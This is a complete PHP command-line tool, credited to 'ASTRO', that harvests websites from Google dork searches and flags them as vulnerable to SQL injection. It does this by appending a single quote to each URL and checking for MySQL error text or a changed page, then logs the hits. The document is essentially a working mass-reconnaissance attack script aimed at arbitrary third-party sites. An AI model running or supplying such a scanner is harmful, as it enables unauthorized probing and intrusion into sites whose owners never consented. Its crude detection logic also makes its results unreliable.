<?php
system('clear');
error_reporting(0);
if(isset($argv['0'])) {
	echo "\033[37;1m:\033[36;1m\n";
        echo " ========================\n";
        echo " ===  8888b.  88''Yb  ===\n";
        echo " ==    8I  Yb 88__dP   ==\n";
        echo " ==    8I  dY 88''     ==\n";
        echo " ===  8888Y'  88      ===\n";
        echo " ========================\n";
        echo " ==   Coded By ASTRO   ==\n";
        echo " ========================\n";

	}
	
		echo "\n [%] Enter Google Dork: "; 
$os = fopen ("php://stdin","r"); 
$dork= fgets($os); 
if(trim($dork))
		
if(isset($dork)) {
	$offset=5*60*60;
$dateFormat="[h:i:s d-m-Y]";
 $timeNdate=gmdate($dateFormat, time()+$offset); 
		
 $file = 'logs.txt';
 $handle = fopen($file,"a+");
 fwrite($handle, "\n \n \n These Following Sites Are Vuln to sql injection.This is the result of $dork at $timeNdate.\n");
 fclose($handle);
  
	$search=urlencode($dork);
echo "\n [*] Connecting to Google \n";
echo "\n [**] Enter Google Number of pages to scan: "; 
$ha = fopen ("php://stdin","r"); 
$pa= fgets($ha); 
if(is_numeric(trim($pa)))
	for ($pag= 0;$pag< $pa;$pag++){
		
		$url = "https://www.google.com/search?q=$search&ie=utf-8&oe=utf-8&aq=t&start=".$pag."0";
 

		$input = @file_get_contents($url) or die("\n [-] Could not Connect to Google or Query Failed" ) ;
 
		$regexp = "/<a href=\"\/url\?q=(.*?)&amp(.*?)\">/";
 		if(preg_match_all($regexp, $input, $matches, PREG_SET_ORDER)) {
		
					foreach($matches as $match) {
				$resu=urldecode($match[1]);
 				$old = file_get_contents($resu);
				$sresu=$resu.'%27';
 				$new = file_get_contents($sresu);
 				$sqli = array('SQL syntax', 'MySQL', 'mysql_', 'argument is not');
 			      
						if(strpos($new, $sqli['0']) or $old != $new) {
					echo " [+] $sresu : vuln\n";
	
 $file = 'logs.txt';
 $handle = fopen($file,"a+");
 fwrite($handle, "\n".$sresu);
 fclose($handle);
}
 

             				
			}
 		}
		echo " [#] ****** A google Page has been Scanned ******[#]\n";
    	echo " [#] ____________Moving to Next page_____________\n";
	}
	echo " [+] All pages Scanned \n";
	echo " [+] All Results has been saved in logs.txt \n";
	echo " [+] J0B Finished \n";
	echo " [+] Coded By ASTRO\n";
	echo " [+] Banner By EBH\n";
}



?>
